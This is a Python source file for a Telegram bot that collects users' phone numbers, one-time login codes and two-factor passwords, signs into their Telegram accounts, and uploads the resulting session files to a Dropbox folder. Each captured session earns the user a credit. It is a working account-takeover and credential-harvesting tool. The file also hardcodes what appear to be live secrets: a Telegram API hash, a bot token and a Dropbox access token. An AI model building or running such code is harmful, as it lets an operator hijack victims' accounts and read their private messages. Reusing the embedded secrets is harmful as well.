import os
import json
import asyncio
import dropbox
from telethon import TelegramClient, errors
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, filters,
    ContextTypes, ConversationHandler
)

# ---- Your Telegram API keys ----
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

# ---- Dropbox API Integration ----
DROPBOX_ACCESS_TOKEN = "sl.u.AFtdxDuJEPQq-ppFhR1uJeTDspUBbuq1Y4mZ7jAKcZu3PQonwTkr-9ADrdEtJq2OEmaJvU7_l6_5qMeWMnIlHzoQXPEkAspUxn9PR265FUIR6v8NZ0u6BG9qk0q88onCciOxM0zXvaJtzjdeUNc_J5TLgarVDLHNVBwWTEP4MY4mN6Du5R0CNP1uONyeOcqM8d8rujMSZ4wxYxd0gECxKA22HZwNg80JX0TGJRsVZXzLQQGPDu6rqsIQBikIHfOLEIwj4kL44saLEtvBtnISDD4jD9q3cGk4oxLlsIayCRvOCvyQRdNF49nZDkn_kBhsdoHrnrzZRLTXWUiTXl_gfdBUGaLe3DJcoPbm-mfau7twMsegnJyVhH3rnZfNtZImySXMkM8yR26g2tgwnRMWHw0MgTUsqS91DF-wMDzb6xCfhR7z_cxKEIJTIsnQ8rBfof0ZYs_BrB8uDhX18_j2xzLVKmETifQsoCs8I80EMBQ3pFVE_1sCZFUtRY5jP5Nwm19FQVQw5So35TKVVzXmg_v-nAijJyFQkjYR_9Wdb-4kBKVyt_Az6_xXyN9E6Eb-oQ2nbhFGJNf8qvOKXCBeFk8Qa4EU6ZyolGICl3yKkef1moBw4qyJ9Eb_08cHJenSuzZfZboFEbtNnSLX599N3lPMxNgKsDvl0OpWd71fk_0GgOKq6C610khyG_qo7l55zwd6OAXeU_cgyc70T8_9E8r7I7sUefZnIjP79H8FxFu_NFd4PSxnqSXJipfl5jpjPO-TqKTl6hS42KkcBfAOpFpE0V6OZaC9H2FodqXDHyWR1KW_nsHXN2N3NSgThMJaJdyypL-ni4pDwmGqgX8-vIwEtxlYzFVX-Mu78eZRHJ830tuO6_Z_FnLcmJ8GZXBaNC_FMD09aIRNSIBpBKkA3HJXCOf23W3Y0_QTJ15tgMUWeuwMrBDIorw2M7IxgF-ChaTaWbZHnk35L3pWm8UZXucqagx3lesnBmYkn_GGQGrtOkxN3MdoeG3PYs9Y4FT_rmp2TfdiIiUX853f3BfAOljiPq74_2zARAoHh9h6FjTelwckOmOHbmAQuSWubj6qCniztFQ6cjcG1qETxfPULP1ww9Z8KOFeJUbUJ1s2g7qK_IffuuQwz0Xvjm_Tvfo48f7S6VCAy-upXuta9xooqBlSEaKTyQqc_R7COzMarfBSRSVML0mdNkyLFGRkiiCyKOWQXLe8zqxjS-JABKpfBCQcOhSa50KZOyG4NBJGEwl0rp4hFB8YO8Mj64RqVYpWOdYSmwofV0Kgq2rII4w9Fy0XLUjs0WK9HXhnNsAkEucPRgvPHlEr1183M6t3YWnm_MIn7Vn8UTKrPn2d9-5dZh9a58LxKiboN4V7KW9IWuRlH8redw4ZEUI974RBvhRlIsBFaLY8WQ_JvU90nqrfsZNIlW0jDd6t63WhyUHscijy38hpNctF5H277B7aRQsjkus"  # <-- Replace with your Dropbox access token
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

# ---- States for Conversation ----
ASK_PHONE, ASK_CODE, ASK_PASSWORD = range(3)

# ---- Dictionary to track users' login sessions ----
user_sessions = {}

# ---- Credits System ----
CREDITS_FILE = "credits.json"
ADMIN_USER_ID = 1155949927  # <-- Your Telegram user ID (for /allcredits access)

def load_credits():
    if os.path.exists(CREDITS_FILE):
        with open(CREDITS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_credits(credits):
    with open(CREDITS_FILE, "w") as f:
        json.dump(credits, f, indent=4)

def add_credit(user_id):
    credits = load_credits()
    credits[str(user_id)] = credits.get(str(user_id), 0) + 1
    save_credits(credits)
    upload_file_to_dropbox(CREDITS_FILE, f"/{CREDITS_FILE}")

# ---- Upload Any File to Dropbox ----
def upload_file_to_dropbox(local_path, dropbox_path):
    if not os.path.exists(local_path):
        print(f"❌ File not found: {local_path}. Skipping upload.")
        return
    with open(local_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
    print(f"✅ Uploaded {local_path} to Dropbox.")

# ---- Start Command ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Hello! Send me your phone number (with country code, e.g., +123456789).")
    return ASK_PHONE

# ---- Handle Phone Number ----
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.message.from_user.id

    session_name = f"sessions/{phone}"
    os.makedirs("sessions", exist_ok=True)
    client = TelegramClient(session_name, API_ID, API_HASH)

    await client.connect()

    try:
        await client.send_code_request(phone)
        user_sessions[user_id] = {"client": client, "phone": phone}
        await update.message.reply_text("📨 OTP code sent! Please send the code you received.")
        return ASK_CODE
    except errors.PhoneNumberInvalidError:
        await update.message.reply_text("❌ Invalid phone number. Please send a valid one.")
        await client.disconnect()
        return ASK_PHONE

# ---- Handle OTP Code ----
async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    code = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]
    phone = session["phone"]

    try:
        await client.sign_in(phone, code)
        await update.message.reply_text("✅ Logged in successfully!")

        # Upload session file and update credits
        await upload_session_to_dropbox(client, phone, user_id)

        await client.disconnect()
        return ConversationHandler.END

    except errors.SessionPasswordNeededError:
        await update.message.reply_text("🔒 2FA is enabled. Please send your password.")
        return ASK_PASSWORD

    except errors.PhoneCodeInvalidError:
        reply_markup = ReplyKeyboardMarkup([["Retry", "Skip"]], one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text("❗ Invalid OTP. Retry or Skip?", reply_markup=reply_markup)
        return ASK_CODE

# ---- Handle Retry or Skip ----
async def ask_code_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text == "retry":
        await update.message.reply_text("🔁 Okay, please send the code again.")
        return ASK_CODE
    else:
        user_id = update.message.from_user.id
        session = user_sessions.get(user_id)
        if session:
            await session["client"].disconnect()
            user_sessions.pop(user_id, None)
        await update.message.reply_text("⏩ Skipped. Use /start to begin again.")
        return ConversationHandler.END

# ---- Handle 2FA Password ----
async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    password = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]

    try:
        await client.sign_in(password=password)
        await update.message.reply_text("✅ Logged in successfully with 2FA!")

        # Upload session file and update credits
        await upload_session_to_dropbox(client, session["phone"], user_id)

        await client.disconnect()
        return ConversationHandler.END
    except errors.PasswordHashInvalidError:
        await update.message.reply_text("❌ Incorrect password. Please send again.")
        return ASK_PASSWORD

# ---- Upload Session File to Dropbox and Update Credit ----
async def upload_session_to_dropbox(client, phone, user_id):
    session_file_path = f"sessions/{phone}.session"
    dropbox_path = f"/sessions/{phone}.session"

    if not os.path.exists(session_file_path):
        print(f"❌ Session file not found for {phone}. Skipping upload.")
        return

    with open(session_file_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))

    print(f"✅ Session file for {phone} uploaded to Dropbox.")

    # Add +1 credit to user
    add_credit(user_id)

# ---- User Command: /credits ----
async def show_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    credits = load_credits()
    count = credits.get(str(user_id), 0)
    await update.message.reply_text(f"💳 You have {count} credit(s).")

# ---- Admin Command: /allcredits ----
async def show_all_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ You are not authorized to view all credits.")
        return

    credits = load_credits()
    if not credits:
        await update.message.reply_text("📄 No credits data found.")
        return

    text = "📊 All Users Credits:\n\n"
    for uid, count in credits.items():
        text += f"👤 User {uid}: {count} credit(s)\n"

    await update.message.reply_text(text)

# ---- Cancel Command ----
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled. Use /start to begin again.")
    return ConversationHandler.END

# ---- Main Function ----
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [
                MessageHandler(filters.Regex("^(Retry|Skip)$"), ask_code_retry),
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)
            ],
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler('credits', show_credits))
    app.add_handler(CommandHandler('allcredits', show_all_credits))

    print("🚀 Bot running...")
    app.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
